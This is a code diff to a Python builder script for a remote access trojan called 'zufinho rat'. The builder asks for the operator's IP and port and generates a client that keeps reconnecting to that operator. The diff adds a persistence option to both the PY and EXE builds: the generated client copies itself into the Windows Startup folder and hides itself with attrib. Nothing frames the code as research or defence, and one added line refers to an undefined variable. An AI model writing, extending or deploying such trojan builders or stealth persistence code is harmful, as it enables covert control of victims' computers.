@@ -10,12 +10,13 @@ os.system("title zufinho rat")
 name=input("RAT name:")
 ip=input("IP (you can use your radmin ip):")
 port=int(input("Port:"))
-obfuscated=input("Obfuscated? (Y/N) (dont works at EXE)")
+startup=input("Add rat to startup when starts? (Y/N)")
 exepy=input("EXE or PY?")
 if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
     noconsole=input("hide rat console? (Y/N)")
+    obfuscated=input("Obfuscated? (Y/N)")
 
-def py(ip,port,name,noconsole,obf):
+def py(ip,port,name,noconsole,obf,startup):
     os.system("md temp")
     print("Building py...")
     os.system(r"copy src\client.py temp\client.py")
@@ -23,9 +24,18 @@ def py(ip,port,name,noconsole,obf):
     print("copyed temp files...")
     print("creating client...")
     client=open(r"temp\client.py","a")
+    if startup==True:
+        startupcontent="""
+filename = os.path.basename(__file__)
+destin = os.path.expandvars(r"%appdata%\Microsoft\Windows\Start Menu\Programs\Startup")
+destin_file = os.path.join(destin, filename)
+shutil.copy(__file__, destin_file)
+os.system(f'attrib +h "{destin_file}"')
+
+"""
+        client.write(startupcontent)
     clientcontent=f"""
 rat = RAT_CLIENT('{ip}', {port})
-
 if __name__ == '__main__':
     while True:
         try:
@@ -33,7 +43,7 @@ if __name__ == '__main__':
             rat.execute()
         except:
             print("trying reconnect")
-    """
+"""
     client.write(clientcontent)
     print("client created")
     client.close()
@@ -72,7 +82,7 @@ if __name__ == '__main__':
     print("cleared")
     print("rat complete")
 
-def exe(ip,port,name):
+def exe(ip,port,name,startup):
     os.system("md temp")
     print("Building py...")
     os.system(r"copy src\client.py temp\client.py")
@@ -80,6 +90,16 @@ def exe(ip,port,name):
     print("copyed temp files...")
     print("creating client...")
     client=open(r"temp\client.py","a")
+    if startup==True:
+        startupcontent="""
+startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+source_path = sys.executable
+target_path = os.path.join(startup_path, os.path.basename(source_path))
+shutil.copy2(source_path, startup_path)
+os.system(f"attrib {sourcepath} {startup_path} +H")
+
+"""
+        client.write(startupcontent)
     clientcontent=f"""
 rat = RAT_CLIENT('{ip}', {port})
 
@@ -129,7 +149,15 @@ if exepy=="py" or exepy=="PY" or exepy=="Py" or exepy=="pY":
         nocons=True
     else:
         nocons=False
-    py(ip=ip,name=name,port=port,noconsole=nocons,obf=obfus)
+    if startup=="Y" or startup=="y":
+        starts=True
+    else:
+        starts=False
+    py(ip=ip,name=name,port=port,noconsole=nocons,obf=obfus,startup=starts)
 if exepy=="exe" or exepy=="Exe" or exepy=="eXe" or exepy=="exE" or exepy=="EXe" or exepy=="eXE" or exepy=="EXE":
-    exe(ip=ip,port=port,name=name)
+    if startup=="Y" or startup=="y":
+        starts=True
+    else:
+        starts=False
+    exe(ip=ip,port=port,name=name,startup=starts)
 os.system("pause")
